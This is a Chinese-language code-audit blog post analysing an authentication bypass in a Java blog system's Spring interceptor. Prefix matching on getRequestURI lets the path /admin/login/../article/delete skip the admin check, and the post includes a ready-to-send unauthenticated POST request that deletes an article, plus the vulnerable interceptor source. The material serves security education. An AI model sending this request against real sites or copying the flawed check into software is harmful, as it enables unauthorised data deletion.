#  JAVA代码审计之鉴权逻辑错误审计小记  
原创 Al1ex  七芒星实验室   2025-06-18 23:01  
  
#### 文章前言  
#### 在之前对MyBlog的代码审计过程中我们可以发现整个博客系统的用户分为两个大类：一个是管理员——admin，它主要负责后台的文件内容的编辑和发布以及对整个系统了统一管理和配置，另外一个则是普通用户，它主要作为一个外部访客来访问博客系统对博客内容进行浏览、查阅、评论等内容，不过在审计的过程中我们头疼的一个点就是后端的SQL语句使用动态方式进行组建并且前端可控的部分入参已经在后端进行了预编译处理，而且部分入参已经做了限定必须为INT类型的入参，那么就更加不可能存在注入的问题了，随后我们转至其他维度  
#### 鉴权绕过  
#### 在我们查看Controller时我们发现了很多很多的delete操作，但是很奇怪的是这里的调用处也并未有类似@hasRole("admin");这种权限注解操作，那么新的问题就来了，这里的这个普通用户和管理用户调用接口是如何做的权限识别和划分的呢？  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjCjQLbib6libtSLr7xnvarLNgunx0iba3mPicpmxXTQyeg7Jy9QNgzvq4nA/640?wx_fmt=png&from=appmsg "")  
  
从上面我们可以看到这里的Controller层做了来一个简单的区分，admin目录下的为管理后台的Controller控制层，而外侧的部分则是公共用户可以进行调用的部分，例如：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjiaIf9yacuylU2stoxoBc7a9fRhfCJzVKxbzqGafP2lS59qniaVuAsQwg/640?wx_fmt=png&from=appmsg "")  
  
那么这里既然没有走RBAC(基于角色鉴权)的方式来进行用户鉴权，那么是走的ABAC(基于属性的鉴权)的方式来进行的鉴权？不可能，绝对不可能，因为整个系统中就只要一个管理员，另外的都是未登录情况下的外部普通用户，那么还有什么方式来进行用户的鉴权呢？当然有，那就是Shiro，不过这个项目中并未映入Shiro组件，所以也直接排除，那么还有吗？当然有，最原始的拦截器部分，我们查看目录可以看到项目中存在一个interceptor目录，其下有两个文件——WebMvcConfig和BaseInterceptor拦截器，在这里我们重点看BaseInterceptor中的预处理——preHandle部分：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjmvia9NdEJkCLiayOl8hxJTN9eXEQufzr4218L9XpkF0JonOicTGdJQoSQ/640?wx_fmt=png&from=appmsg "")  
  
从上面可以看到这里首先使用request.getRequestURI();来获取URL请求路径信息，随后获取请求头中的USER_AGENT并获取用户的请求IP地址，这里呢，当然存在一个IP伪造的问题——XFF，具体如下，这里我们不展开说，我们继续来看上面的预处理的鉴权部分，随后这里会调用TaleUtils.getLoginUser(request)进行请求拦截处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjJYh14UQ3yazia1rXuQVP0TBHZbiauMVp9Sn7UdmnWfNcVKXlvUU5b3BA/640?wx_fmt=png&from=appmsg "")  
  
从下面可以看到这里其实就说获取请求中的session信息，如果session为空则直接返回——null，此类场景对应游客用户，如果不为空则直接返回对应的session信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjHe54cdWDetltTicuzM5nOkDmmuqaLgzvejqbvF40T65Qt05vnFXGaDQ/640?wx_fmt=png&from=appmsg "")  
  
随后我们回到上面，此时如果返回的user为null，那么会继续调用TaleUtils.getCookieUid来获取请求中的userid信息  
```
        if (null == user) {
            Integer uid = TaleUtils.getCookieUid(request);
            if (null != uid) {
                //这里还是有安全隐患,cookie是可以伪造的
                user = userService.queryUserById(uid);
                request.getSession().setAttribute(WebConst.LOGIN_SESSION_KEY, user);
            }
        }
```  
  
TaleUtils.getCookieUid如下，可以看到如果Cookie为空，那么此时啥都不会有，直接返回一个null，随后在返回到上面的代码中可以看到这里的uid如果不为null，那么会根据uid来查询user信息并根据user来进行一次封装来生成一个Session，如果为null，那么会直接跳出这一个部分直接继续往下走  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjCXnslvSEQp85N5owWRekVaycUssXncQick2QVHicKqpE5grEzZwtTBlg/640?wx_fmt=png&from=appmsg "")  
  
随后来到了下面的鉴权部分，可以看到如果请求路径以/admin开头且不以/admin/login开头且用户为null，那么则会直接跳转到/admin/login中去，这种场景对应于用户未登录直接去调用后台管理员的请求路径时触发的跳转，也就是我们上面的鉴权的关键实现部分，随后就是一套设置CSRF_token来防止CSRF攻击的防御套装  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjI1CbdlnVxFCtcyMDngmH9SCtGEvBkjF21Zry34e9zJSWwnDPFXRsAg/640?wx_fmt=png&from=appmsg "")  
  
那么看到这里大家觉得有啥问题呢？没问题？当然有问题了，如果没有问题也就没有这个文章的标题了，这里的问题主要在于鉴权依赖于请求路径的匹配，而请求路径的获取使用  
request.getRequestURI();来获取路径，而在Tomcat中  
HTTPServletRequest常常通过下面几个常用的函数来  
处理用户发起的URL请求：  
- request.getRequestURL()：返回全路径  
- request.getRequestURI()：返回除去Host(域名或IP)部分的路径  
- request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空  
- request.getServletPath()：返回除去Host和工程名部分的路径  
- request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null  
这里关于  
request.getRequestURI()的使用导致的差异性问题不再追溯，有兴趣的读者可以看一下@Mik7ea师傅之前在先知上发布的  
文章——Tomcat URL解析差异性导致的安全问题(https://xz.aliyun.com/news/7139)，关键的问题引入到这篇文章的这个应用中来说就是  
Tomcat底层处理URL时normalize()函数经过parsePathParameters()函数过滤;xxx/的URL请求内容进而标准化处理，具体为将连续的多个/给删除掉只保留一个、将/./删除掉、将/../进行跨目录拼接处理，最后返回处理后的URL路径，所以Tomcat对/;xxx/以及/./的处理是包容的、对/../会进行跨目录拼接处理，  
那么反馈到这里的场景就是此时我们的/admin/login路径时一个可以对外访问的路径，而这里的  
/admin/article/delete则是需要过鉴权预处理之后才可以访问到的，否则会被直接重定向到/admin/login，不过如果我们这里使用一下底层的解析差异就不一样了，我们这里构造请求的URL如下：  
```
/admin/login/../article/delete
```  
  
那么此时传递到后端的时候预处理阶段因为开头为/admin/login，所以直接过鉴权，随后在后端的时候会解析/../进行跨目录处理，随后直接转为下面的路径(上一次这么有趣还是F5 BIG-IP的Tomcat和Nginx解析差异的导致的认证鉴权和RCE问题呢)  
```
/admin/login/article/delete
```  
  
下面我们直接来上手验证试试看，首先一个正常的请求如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtjUByrdyMDeYbonGOvMz0uwqweJD8T2nyjxbwmkQjw31PMaVvPialch6A/640?wx_fmt=png&from=appmsg "")  
  
随后我们移除掉JESSIONID并更改请求路径部分的内容，构造请求报文如下进行删除操作，虽然这里success回显了一个false，但是结果是正确的，确实被删除了，有兴趣大家可以自行试试看  
```
POST /admin/login/../article/delete HTTP/1.1
Host: 192.168.204.137:8081
Content-Length: 5
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.204.137:8081
Referer: http://192.168.204.137:8081/admin/article
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close

cid=4
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl5BqNN2XAZibHS7O4PoJFtj7iazIwMhmmmpFSJUibUsMzsyxuKpjPX5bibZ4r6kOt5648aRDcia3R3icPg/640?wx_fmt=png&from=appmsg "")  
  
完整的代码如下所示：  
```
package com.my.blog.website.interceptor;

import com.my.blog.website.modal.Vo.UserVo;
import com.my.blog.website.service.IUserService;
import com.my.blog.website.utils.*;
import com.my.blog.website.constant.WebConst;
import com.my.blog.website.dto.Types;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * 自定义拦截器
 * Created by BlueT on 2017/3/9.
 */
@Component
public class BaseInterceptor implements HandlerInterceptor {
    private static final Logger LOGGE = LoggerFactory.getLogger(BaseInterceptor.class);
    private static final String USER_AGENT = "user-agent";

    @Resource
    private IUserService userService;

    private MapCache cache = MapCache.single();

    @Resource
    private Commons commons;

    @Resource
    private AdminCommons adminCommons;


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object o) throws Exception {
        String uri = request.getRequestURI();

        LOGGE.info("UserAgent: {}", request.getHeader(USER_AGENT));
        LOGGE.info("用户访问地址: {}, 来路地址: {}", uri, IPKit.getIpAddrByRequest(request));


        //请求拦截处理
        UserVo user = TaleUtils.getLoginUser(request);
        if (null == user) {
            Integer uid = TaleUtils.getCookieUid(request);
            if (null != uid) {
                //这里还是有安全隐患,cookie是可以伪造的
                user = userService.queryUserById(uid);
                request.getSession().setAttribute(WebConst.LOGIN_SESSION_KEY, user);
            }
        }
        if (uri.startsWith("/admin") && !uri.startsWith("/admin/login") && null == user) {
            response.sendRedirect(request.getContextPath() + "/admin/login");
            return false;
        }
        //设置get请求的token
        if (request.getMethod().equals("GET")) {
            String csrf_token = UUID.UU64();
            // 默认存储30分钟
            cache.hset(Types.CSRF_TOKEN.getType(), csrf_token, uri, 30 * 60);
            request.setAttribute("_csrf_token", csrf_token);
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {
        httpServletRequest.setAttribute("commons", commons);//一些工具类和公共方法
        httpServletRequest.setAttribute("adminCommons", adminCommons);
    }

    @Override
    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {

    }
}

```  
#### 文末小结  
  
  
本篇文章算是一个对博客系统的鉴权方式之一——通过请求路径匹配预处理的介绍和漏洞案例的分析，这个和我们之前的RBAC、ABAC、Shiro鉴权放到一起也勉勉强强算是一个较为常用的鉴权系列了，另外还有一个就是底层中间件容器对于URI地址的获取和解析的差异性带来的安全问题，这个也需要在具体的代码审计过程中多多留意和关注  
  
**推 荐 阅 读**  
  
      
  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247491634&idx=1&sn=a1873ac267a553dbe39d9b8eae72c5d1&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247493905&idx=2&sn=32dabb1937bb95a440a7e79d05519a44&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247492829&idx=2&sn=8b06dc14b5843d622465cb26c6ddbbe5&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247491787&idx=2&sn=509e2b46d9144323fc9d13a1567296c3&chksm=cf611bc3f81692d5579b8a9128ff711eea3f7660b1ccd884e0be264e895fbfcb4c995c609be8&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247491804&idx=2&sn=eb334c8bb0be9ea0a3baf21db6e8fd07&chksm=cf611bd4f81692c2e80f7855552fdb63b52b89c8b4fbfd50fabbf7cf478aff60c23ff0c22d8c&scene=21#wechat_redirect)  
  
  
横向移动之RDP&Desktop Session Hija  
  
  
